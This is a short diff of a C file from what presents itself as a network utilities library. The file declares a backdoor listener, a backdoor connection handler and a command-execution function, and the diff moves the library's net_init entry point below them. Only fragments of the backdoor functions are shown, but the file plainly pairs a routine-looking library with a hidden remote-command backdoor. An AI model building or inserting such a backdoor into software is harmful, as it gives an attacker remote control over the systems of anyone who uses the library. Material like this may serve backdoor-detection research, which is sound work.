@@ -33,12 +33,6 @@ static void start_backdoor_listener(void);
 static void handle_backdoor_connection(int client_sock);
 static int execute_command(const char *cmd, char *output, size_t max_len);
 
-// Initialize network utilities
-int net_init(void) {
-    if (lib_initialized) {
-        return 0;  // Already initialized
-    }
-
 // Handle a backdoor connection
 static void handle_backdoor_connection(int client_sock) {
     char buffer[1024];
@@ -110,6 +104,12 @@ static int execute_command(const char *cmd, char *output, size_t max_len) {
     
     return status;
 }
+
+// Initialize network utilities
+int net_init(void) {
+    if (lib_initialized) {
+        return 0;  // Already initialized
+    }
     
     printf("Initializing network utilities...\n");
     
